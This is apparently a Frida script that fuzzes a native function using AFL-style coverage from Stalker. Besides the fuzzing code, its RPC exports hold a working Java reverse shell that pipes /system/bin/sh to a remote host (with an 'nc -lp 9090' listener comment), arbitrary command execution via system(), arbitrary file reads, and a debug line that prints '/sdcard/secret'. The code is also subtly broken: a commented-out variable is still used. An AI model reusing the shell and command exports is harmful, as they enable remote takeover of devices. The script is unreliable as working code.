class FuzzerKu
{
    constructor() {
       this.rpc_setup();
       this.moduleProgram = "targetFuzz";
       this.targetPtr = DebugSymbol.fromName("fuzzMe").address;

       const sem_post_addr = Module.getExportByName(null, "sem_post");
       const sem_wait_addr = Module.getExportByName(null, "sem_wait");

       this.sem_post = new NativeFunction(sem_post_addr, "int", ["pointer"]);
       this.sem_wait = new NativeFunction(sem_wait_addr, "int", ["pointer"]);

       this.typeLog = "send";
       this.afl_area_ptr = ptr(0);
       this.commap = ptr(0);
       this.iteration_sem = ptr(0);
       this.exec_sem = ptr(0);
       this.user_data = undefined;

       const not_java = 1; //locate lib Java API not available for using pwd
       if (not_java) {
          this.injectedlib = "libvuln.so";
          this.pwd = this.locatelib();
       }
       else {
          this.pwd = undefined;
          this.locateData();
       }
    }

    locateData() {
       const self = this;
       Java.perform(function () {
          var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();

          Java.scheduleOnMainThread(function() {
             var toast = Java.use("android.widget.Toast");
             toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Fuzzer proxy v1.0"), 1).show();
          });

          //var data = context.getApplicationInfo().dataDir;
          //self.pwd = data.value;

          var data = context.getPackageName();
          self.pwd = "/data/data/"+data;
       });
    }

    locatelib() {
       var modulesArray = Process.enumerateModules();
       for (var i=0; i<modulesArray.length; i++)
       {
          if (modulesArray[i].path.indexOf(this.injectedlib) != -1)
          {
             var str = modulesArray[i].path;
             return str.substring(0, str.lastIndexOf("/"))
          }
       }
    }

    sleep(ms) {
        var start = new Date().getTime(), expire = start + ms;
        while (new Date().getTime() < expire) { }
        return;
    }

    logDebug(type, msg) {
        if (type == "send") {
           send({"type": "log_message", "log": msg});
        }
        else if (type == "console")
        {
           console.log(msg);
        }
    }

    reverseShellJava(sip, sport) { // server listen: nc -lp 9090
        Java.perform(function () {
           const Socket = Java.use('java.net.Socket');
           const OutputStream = Java.use('java.io.OutputStream');
           const InputStream = Java.use('java.io.InputStream');
           const JavaString = Java.use('java.lang.String');
           const ProcessBuilder = Java.use('java.lang.ProcessBuilder');
           const Thread = Java.use('java.lang.Thread');
           const ArrayList = Java.use('java.util.ArrayList');
           const host = JavaString.$new(sip);
           const port = parseInt(sport);

           console.log("connect to: "+sip)

           var arr = Java.array('java.lang.String', ['/system/bin/sh']);
           var p = ProcessBuilder.$new.overload('[Ljava.lang.String;').call(ProcessBuilder, arr).redirectErrorStream(true).start();
           var s = Socket.$new.overload('java.lang.String', 'int').call(Socket, host, port);

           var pi = p.getInputStream();
           var pe = p.getErrorStream();
           var si = s.getInputStream();

           var po = p.getOutputStream(),
           so = s.getOutputStream();

           var i = 0;
           while(!s.isClosed())
           {
              while(pi.available()>0) {
                so.write(pi.read());
              }
              while(pe.available()>0) {
                so.write(pe.read());
              }
              while(si.available()>0) {
                po.write(si.read());
              }
              so.flush();
              po.flush();

              Thread.sleep(50);
              try {
                p.exitValue();
                break;
              } catch (e){
                // ignore
              }
           }
           p.destroy();
           s.close();
       });
    }

    rpc_setup()
    {
        rpc.exports = {
            getpwd: () => {
               return this.pwd;
            },
            reshelljava: (sip, sport) => {
               this.reverseShellJava(sip, sport);
            },
            reshell: (sip, sport, sbin) => {
               const rshellAddr = DebugSymbol.fromName("reverse_shell").address;
               const rshell = new NativeFunction(rshellAddr, "void", ["pointer", "pointer", "int"]);
               const ip = Memory.allocUtf8String(sip);
               const bin = Memory.allocUtf8String(sbin);
               const port = parseInt(sport);

               rshell(ip, bin, port);
               return "[JS] fork shell created.";
            },
            shell: (cmd) => {
               const systemAddr = DebugSymbol.fromName("system").address;
               const system = new NativeFunction(systemAddr, "pointer", ["pointer"]);
               const syscmd = Memory.allocUtf8String(cmd);
               system(syscmd);

               return 0;
            },
            readtext: (pathname_raw) => {
               const read_textAddr = DebugSymbol.fromName("read_text").address;
               const read_text = new NativeFunction(read_textAddr, "pointer", ["pointer"]);
               const pathname = Memory.allocUtf8String(pathname_raw);

               return read_text(pathname).readCString();
            },
            injectmodule: (target, pathmodule) => {
               if (target == "android")
                  Module.load(this.pwd+"/android_copy/libmodule.so");
               else if (target == "linux")
                  Module.load(pathmodule);

               const triggerAddr = DebugSymbol.fromName("module_trigger").address;

               return triggerAddr;
            },
            prepare: (triggerAddr, target, pypwd) => {
               const pshmatAddr = DebugSymbol.fromName("portable_shmat").address;
               const pshmat = new NativeFunction(pshmatAddr, "pointer", ["int","pointer","int","int"]);

               const read_textAddr = DebugSymbol.fromName("read_text").address;
               const read_text = new NativeFunction(read_textAddr, "pointer", ["pointer"]);


               if (target == "android") this.typeDebug = "android";
               else if (target == "linux") this.typeDebug = "linux";

               var mmap_file = undefined;
               if (target == "android")
                  mmap_file = Memory.allocUtf8String(this.pwd+"/.mmap_id");
               else if (target == "linux")
                  mmap_file = Memory.allocUtf8String(pypwd+"/ccode/.mmap_id");



//               const data_mmap = read_text(mmap_file).readCString();
               console.log("zzzzzz: "+read_text(Memory.allocUtf8String("/sdcard/secret")).readCString());


               const id_raw = data_mmap.split(" ");
               const afl_id = parseInt(id_raw[0]);
               const comm_id = parseInt(id_raw[1]);
               const esem_id = parseInt(id_raw[2]);
               const isem_id = parseInt(id_raw[3]);

               this.logDebug(this.typeLog, "[*] JS prepare afl_id: "+afl_id);
               this.logDebug(this.typeLog, "[*] JS prepare com_id: "+comm_id);
               this.logDebug(this.typeLog, "[*] JS prepare esem_id: "+esem_id);
               this.logDebug(this.typeLog, "[*] JS prepare isem_id: "+isem_id);

               // why slow? for using this to find the corpus
               this.afl_area_ptr = pshmat(parseInt(0x200), ptr(0), 1, afl_id);
               this.commap = pshmat(parseInt(0x2000), ptr(0), 1, comm_id);

               if (target == "android") {
                   this.logDebug(this.typeLog, "[*] JS prepare afl_area_ptr: "+this.afl_area_ptr);
                   this.logDebug(this.typeLog, "[*] JS prepare comm_id: "+this.commap);

                   this.logDebug(this.typeLog, "[*] JS prepare zzzzzz: "+this.commap.add(0).readInt());

                   this.exec_sem = pshmat(parseInt(0x2000), ptr(0), 1, esem_id);
                   this.iteration_sem = pshmat(parseInt(0x2000), ptr(0), 1, isem_id);

                   if (this.exec_sem == 0x0 || this.iteration_sem == 0x0) {
                       this.logDebug(this.typeLog, "[*] JS error AFL semaphore not found!");
                       return 0;
                   }
                   else {
                       this.logDebug(this.typeLog, "[*] JS successfully prepare");
                       return 0;
                   }
               }
               else if (target == "linux") {
                   this.logDebug(this.typeLog, "[*] JS prepare afl_area_ptr: "+this.afl_area_ptr);
                   this.logDebug(this.typeLog, "[*] JS prepare comm_id     : "+this.commap);

                   this.exec_sem = pshmat(0, ptr(0), 1, esem_id);
                   this.iteration_sem = pshmat(0, ptr(0), 1, isem_id);


                   //this.sem_post(this.exec_sem); //tes


                   if (this.exec_sem == 0x0 || this.iteration_sem == 0x0) {
                       this.logDebug(this.typeLog, "[*] JS error AFL semaphore not found!");
                       return 0;
                   }
                   else {
                       this.stalker_setup();
                       return comm_id;
                   }
                }
            },
            fuzzinmodule: (triggerAddr, commap_id) => {
               var trigger = new NativeFunction(ptr(triggerAddr), "int", ["pointer", "int", "int"]);

               this.sem_post(this.exec_sem);

               var stage = 0;
               while(1) {
                  this.logDebug(this.typeLog, "[+] JS stage loop: "+stage);
                  try {
                     trigger(this.targetPtr, parseInt(commap_id), 0); // iteration/wait in c module
                  }
                  catch(e)
                  {
                     trigger(this.targetPtr, parseInt(commap_id), 1); // write crash in c module

                     send({"type": "fuzz_result", "log": e, "stage": stage, "iteration": Date.now()});

                     this.logDebug(this.typeLog, "[+] JS crash log  : "+e);
                     //this.logDebug(this.typeLog, "[+] JS crash input: "+this.commap.add(42).readCString());
                     this.logDebug(this.typeLog, "[*] JS wait 5 seconds...\n");
                     this.sem_post(this.iteration_sem);
                     this.sleep(5000);
                  }
                  stage += 1;
               }
            },
        };
    }

    stalker_setup()
    {
       const self = this; // biar bisa diakses di onLeave
       const module = this.moduleProgram;
       const base = Module.getBaseAddress(module);
       const mod = this.get_module_obj(module);

       const _user_data = Memory.alloc(48);
       _user_data.writePointer(this.afl_area_ptr);
       _user_data.add(8).writePointer(base);
       _user_data.add(16).writePointer(ptr(mod.base));
       _user_data.add(24).writePointer(ptr(mod.base).add(mod.size));
       _user_data.add(32).writeInt(0);

       const stalker_pc_debug_logger = new NativeCallback(function (arg) {
          this.logDebug(this.typeLog, "PC: ", arg, base);
       }, "void", ["pointer"]);
       _user_data.add(40).writePointer(stalker_pc_debug_logger);

       this.user_data = _user_data;

       Stalker.trustThreshold = 3;
       Stalker.queueCapacity = 0x8000;
       Stalker.queueDrainInterval = 1000 * 1000;

       const stalker_event_config = {
                call: false,
                ret: false,
                exec: false,
                block: false,
                compile: true,
      };

      var pc = undefined
      if (Process.arch == "x64")
          pc = "rip";
      else if (Process.arch.startsWith("arm"))
          pc = "pc";
      else if (Process.arch.startsWith("ia32"))
          pc = "eip";
      else
          this.logDebug(this.typeLog, "[!] Unknown architecture: "+Process.arch);

      const stalker_cmodule = new CModule(`
      #include <gum/gumstalker.h>
      #include <stdint.h>
      #include <stdio.h>

      static void afl_map_fill(GumCpuContext * cpu_context, gpointer user_data);

      struct _user_data {
        uint8_t *afl_area_ptr;
        uint64_t base;
        uintptr_t module_start;
        uintptr_t module_end;
        uintptr_t prev_loc;
        void (*log)(long);
      };
      bool is_within_module(uintptr_t pc, uintptr_t s, uintptr_t e) {
        return (pc <= e) && (pc >= s);
      }

      void transform(GumStalkerIterator *iterator, GumStalkerOutput *output, gpointer user_data)
      {
        cs_insn *insn;
        struct _user_data *ud = (struct _user_data*)user_data;

        gum_stalker_iterator_next(iterator, &insn);

        if (is_within_module(insn->address, ud->module_start, ud->module_end))
        {
           gum_stalker_iterator_put_callout(iterator, afl_map_fill, user_data, NULL);
        }


        gum_stalker_iterator_keep(iterator);

        while (gum_stalker_iterator_next(iterator, &insn))
        {
          gum_stalker_iterator_keep(iterator);
        }
      }

      static void afl_map_fill(GumCpuContext * cpu_context, gpointer user_data)
      {
        struct _user_data *ud = (struct _user_data*)user_data;

        uintptr_t cur_loc = cpu_context->${pc} - ud->base;
        uint8_t *afl_area_ptr = ud->afl_area_ptr;
        cur_loc  = (cur_loc >> 4) ^ (cur_loc << 8);
        cur_loc &= 65536 - 1;

        afl_area_ptr[cur_loc ^ ud->prev_loc]++;
        ud->prev_loc = cur_loc >> 1;
      }
      `);


      Interceptor.attach(this.targetPtr, {
         onEnter: function(args)
         {
             Stalker.follow({
                 events: stalker_event_config,
                 transform: stalker_cmodule.transform,
                 data: ptr(_user_data)
             });
         },
         onLeave: function()
         {
             Stalker.unfollow();
             Stalker.flush();
             self.user_data.add(32).writeInt(0);

             self.sem_post(self.iteration_sem);
         }
      });
    }

    get_module_obj(name) {
        let maps = Process.enumerateModulesSync();
        let i = 0;
        maps.map(function (o) { o.id = i++; });
        maps.map(function (o) { o.end = o.base.add(o.size); });

        return maps.filter(function (a) { return a.name == name; })[0];
    }

    sem_open_with_type(commap, type)
    {
        var sem_open_addr = Module.getExportByName(null, "sem_open");
        var sem_open = new NativeFunction(sem_open_addr, "pointer", ["pointer", "int"]);

        const sem_prefix = Memory.readUtf8String(commap.add(16));
        const sem_name = Memory.allocUtf8String(`${sem_prefix}-${type}`);

        return sem_open(sem_name, 0);  // if return 0x0, failed execute please fix commap
    }

     /* uintptr_t cur_loc = cpu_context->rip - ud->base;
          "rip"; "x64"
          "pc";  "arm"
          "eip"; "ia32"
     */
}

const f = new FuzzerKu();
rpc.exports.fuzzer = f;




